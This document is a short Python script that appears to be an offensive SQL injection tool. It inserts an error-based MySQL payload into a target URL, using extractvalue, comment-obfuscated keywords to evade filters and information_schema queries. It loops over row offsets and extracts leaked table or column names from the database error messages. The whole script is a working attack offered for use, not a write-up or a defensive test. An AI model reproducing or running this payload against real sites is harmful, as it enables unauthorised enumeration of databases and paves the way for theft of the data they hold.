#/!python3
#!/usr/bin/python3

import re
import requests

target = input('\n\033[94m Injection Ponit :\033[0m ')
# post = input('\033[94m POST Parameter  :\033[0m ')
dump = input('\033[94m (table/column)? :\033[0m ')
frm = int(input('\033[94m From \t\t :\033[0m '))
to = int(input('\033[94m To   \t\t :\033[0m '))

print("\n\033[1m________________________________________________________________________\033[0m\n")

regex = r"syntax error: [\']?([^\' ]+)"

payload = " and extractvalue(0x3a,concat/*!(0x3a,(/*!00000SelEcT*/ concat/*!("+dump+"_name)*/ /*!from*/ information_schema./**/"+dump+"s where table_schema=database() limit {},1)))-- -"

for x in range(frm, to):

	url = target.replace("inject",payload).format(x)
	response = requests.get(url=url)
	matches = re.finditer(regex, str(response.text))

	for matchNum, match in enumerate(matches):
		matchNum = matchNum + 1

		for groupNum in range(0, len(match.groups())):
			groupNum = groupNum + 1
			print ("{}) {group}".format(x,group = match.group(groupNum)))

print("________________________________________________________________________")
print("\n\t\t\tFinished!!!\n")
